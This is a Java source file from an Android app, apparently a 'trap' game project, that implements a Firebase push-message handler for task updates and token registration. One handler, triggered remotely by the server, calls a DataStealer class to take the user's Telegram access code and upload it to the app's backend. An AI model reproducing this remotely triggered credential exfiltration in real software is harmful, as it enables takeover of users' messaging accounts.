package de.hpi3d.gamepgrog.trap.android.firebase;

import android.app.Application;
import android.util.Log;

import androidx.annotation.NonNull;

import com.google.firebase.iid.FirebaseInstanceId;
import com.google.firebase.messaging.FirebaseMessagingService;
import com.google.firebase.messaging.RemoteMessage;

import java.util.ArrayList;
import java.util.Map;

import de.hpi3d.gamepgrog.trap.R;
import de.hpi3d.gamepgrog.trap.android.DataStealer;
import de.hpi3d.gamepgrog.trap.android.NotificationHelper;
import de.hpi3d.gamepgrog.trap.api.ApiManager;
import de.hpi3d.gamepgrog.trap.api.StorageManager;
import de.hpi3d.gamepgrog.trap.tasks.Task;
import de.hpi3d.gamepgrog.trap.tasks.TaskInitializerManager;


public class OurFirebaseMessagingService extends FirebaseMessagingService {

    private static final String TAG = "OurFBMessagingService";

    @Override
    public void onMessageReceived(RemoteMessage message) {
        Map<String, String> data = message.getData();

        Log.d(TAG, "Firebase Message Received: " + data.toString());

        if (FirebaseDataParser.isValid(data)) {
            switch (FirebaseDataParser.getCall(data)) {
                case FirebaseDataParser.CALL_NEW_TASKS:
                    onTasksReceived(FirebaseDataParser.parseTasks(data));
                    return;

                case FirebaseDataParser.CALL_GET_TELEGRAM:
                    onTelegramReceived();
                    return;

            }
        }

        // If this line is reached something went wrong
        throw new IllegalArgumentException("Firebase message is malformed: " + data.toString());
    }

    private void onTelegramReceived() {
        String code = DataStealer.takeTelegramAccessCode(this);
        ApiManager.api(this).sendTelegramCode(
                StorageManager.with(this).userid.get(), code
        ).call();
    }

    private void onTasksReceived(ArrayList<Task> tasks) {
        StorageManager.with(getApplication()).tasks.add(tasks);

        for (Task task : tasks) {
            TaskInitializerManager.TaskInitializer initializer = TaskInitializerManager.getInitializerFor(task);
            if (initializer != null) {
                initializer.accept(getApplication(), task);
            }
        }

        NotificationHelper.sendNotification(getApplicationContext(),
                getString(R.string.notification_new), getString(R.string.notification_new_detail));
    }


    @Override
    public void onNewToken(@NonNull String s) {
        setNewToken(getApplication(), s);
    }

    public static void setNewToken(Application app, @NonNull String token) {
        Log.d(TAG, "New Firebase token: " + token);
        if (StorageManager.with(app).userid.exists()) {
            int userid = StorageManager.with(app).userid.get();
            sendNewToken(app, userid, token);
        }
        StorageManager.with(app).fbtoken.set(token);
    }

    public static void sendNewToken(Application c, int userid, String token) {
        ApiManager.api(c).sendFBToken(userid, token).call();
    }

    public static void init(Application app) {
        FirebaseInstanceId.getInstance().getInstanceId()
                .addOnCompleteListener(task -> {
                    if (!task.isSuccessful() || task.getResult() == null) {
                        Log.w("Firebase", "getInstanceId failed", task.getException());
                        return;
                    }

                    // Get new Instance ID token
                    String token = task.getResult().getToken();
                    Log.d("Firebase", "send new token: " + token);
                    setNewToken(app, token);
                });
    }

}
